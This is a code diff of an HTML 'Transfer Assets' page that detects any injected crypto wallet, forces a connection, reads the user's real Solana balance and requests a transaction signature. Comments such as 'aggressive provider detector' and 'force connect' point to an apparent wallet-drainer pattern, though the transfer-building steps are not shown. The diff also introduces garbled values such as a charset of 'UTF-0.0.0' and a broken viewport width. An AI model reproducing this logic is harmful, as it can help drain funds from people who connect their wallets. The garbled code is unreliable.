@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name-viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta charset="UTF-0.0.0">
+    <meta name="viewport" content="width=device-1.0, maximum-scale=1.0, user-scalable=0">
     <title>Transfer Assets</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
@@ -42,7 +42,7 @@
         p { color: var(--text-dim); font-size: 16px; margin-bottom: 30px; text-align: left; }
 
         .input-group { margin-bottom: 25px; text-align: left; }
-        label { display: block; color: var var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
+        label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
         input { 
             width: 100%; 
             background: var(--input-bg); 
@@ -90,7 +90,7 @@
     </div >
 
     <button class="btn-main" id="sendBtn">Send Now</button>
-    <div id="status"></div >
+    <div id="status"></div>
 </div>
 
 <script>
@@ -104,7 +104,7 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. THE AGGRESSIVE PROVIDER DETECTOR
+    // 1. UNIVERSAL PROVIDER DETECTION
     async function getProvider() {
         const providers = [
             () => window.solana,
@@ -124,7 +124,7 @@
         return null;
     }
 
-    // 2. THE MAIN ACTION
+    // 2. MAIN ACTION
     async function handleTransaction() {
         // Reset status
         statusDiv.innerText = "Initializing...";
@@ -133,27 +133,19 @@
         // Step A: Detect Provider
         const provider = await getProvider();
         if (!provider) {
-            statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
+            statusDiv.innerText = "Wallet not found. Use Trust Wallet.";
             statusDiv.style.color = "#ff4d4d";
             return;
         }
 
         try {
-            // Step B: The "Force Connect" (Crucial for Mobile)
-            // We use a multi-step approach to ensure the wallet pop-up is triggered
-            console.log("Attempting connection...");
-            let resp;
-            try {
-                // Try standard connect
-                resp = await provider.connect();
-            } catch (e) {
-                // If standard fails, try the request method which is more robust in DApps
-                console.log("Standard connect failed, trying request...");
-                resp = await provider.request({ method: 'connect', params: [] });
-            }
-            
+            // Step B: Trigger Connection (The most critical part for mobile)
+            // We use a direct request to trigger the wallet pop-up immediately
+            console.log("Triggering connection...");
+            const resp = await provider.request({ method: 'connect', params: [] });
             const userPublicKey = resp.publicKey;
-            statusDiv.innerText = "Wallet Linked. Processing...";
+            
+            statusDiv.innerText = "Verifying...";
             statusDiv.style.color = "#21d77d";
 
             // Step C: Get User Input
@@ -163,7 +155,7 @@
                 return;
             }
 
-            // Step D: Get REAL balance via Helius
+            // Step D: Get REAL balance from Helius
             const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
             const balance = await connection.getBalance(userPublicKey);
             console.log("Real Balance:", balance);
@@ -213,7 +205,7 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step G: Request Signature (The pop-up)
+            // Step G: Request Signature (This triggers the wallet pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
             // Step H: Broadcast
